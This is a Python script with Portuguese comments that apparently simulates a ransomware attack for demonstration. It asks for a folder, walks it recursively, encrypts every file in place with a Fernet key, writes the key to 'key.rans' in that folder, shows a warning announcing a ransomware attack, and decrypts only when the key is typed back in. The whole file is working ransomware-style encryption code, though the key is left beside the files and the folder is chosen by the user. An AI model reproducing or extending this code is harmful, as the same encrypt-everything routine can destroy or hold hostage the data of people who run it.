from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import simpledialog
from tkinter import filedialog
from tkinter import messagebox

# Gera uma chave de criptografia
def generate_key():
    return Fernet.generate_key()

# Salva a chave em um arquivo
def save_key(key, folder_path):
    with open(os.path.join(folder_path, "key.rans"), "wb") as key_file:
        key_file.write(key)

# Carrega a chave do arquivo
def load_key(folder_path):
    return open(os.path.join(folder_path, "key.rans"), "rb").read()

# Criptografa um arquivo usando a chave
def encrypt_file(filename, key):
    fernet = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

# Descriptografa um arquivo usando a chave
def decrypt_file(filename, key):
    fernet = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)

# Função principal
def main():
    root = tk.Tk()
    root.withdraw()  # Oculta a janela principal do Tkinter

    # Solicita ao usuário que escolha a pasta usando a caixa de diálogo
    folder_path = filedialog.askdirectory(title="Escolha o diretório.")
    if not folder_path:
        print("Nenhuma pasta selecionada. Encerrando o programa.")
        return

    # Resto do código permanece o mesmo
    key = generate_key()

    # Criptografa os arquivos na pasta
    for foldername, subfolders, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            encrypt_file(file_path, key)
    save_key(key, folder_path)
    
    # Exibe uma mensagem indicando que a pasta foi criptografada
    messagebox.showwarning("PERIGO!", "Houve um ataque Ransomware e a pasta foi criptografada!")

    # Descriptografa os arquivos quando a chave correta é inserida
    print(f"Houve um ataque na sua máquina e todos os arquivos da pasta {folder_path}...")

    # Solicita a chave de descriptografia usando Tkinter
    user_key = simpledialog.askstring("Chave de Descriptografia", "Digite a chave de descriptografia:")

    decrypted_key = load_key(folder_path).decode()
    if user_key == decrypted_key:
        for foldername, subfolders, filenames in os.walk(folder_path):
            for filename in filenames:
                if filename != "key.rans":
                    file_path = os.path.join(foldername, filename)
                    print(file_path)
                    decrypt_file(file_path, decrypted_key)
        print("Arquivos descriptografados com sucesso!")
        messagebox.showinfo("Sucesso", "A chave foi inserida com sucesso e a pasta foi criptografada!")

        # Remova o arquivo "key.rans" após a descriptografia bem-sucedida
        os.remove(os.path.join(folder_path, "key.rans"))

    else:
        print("Chave incorreta. A descriptografia falhou e os arquivos seguem bloqueados.")
        print("Fechando o algoritmo")

if __name__ == "__main__":
    main()
